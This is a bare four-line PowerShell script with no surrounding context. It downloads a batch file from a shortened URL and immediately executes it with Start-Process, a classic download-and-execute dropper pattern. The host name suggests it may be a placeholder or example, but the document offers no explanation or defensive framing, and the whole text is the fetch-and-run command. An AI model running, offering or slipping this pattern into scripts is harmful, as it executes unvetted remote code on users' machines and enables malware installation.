$url = "https://bit.ly/fakebatman"
$output = "downloaded_file.bat"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
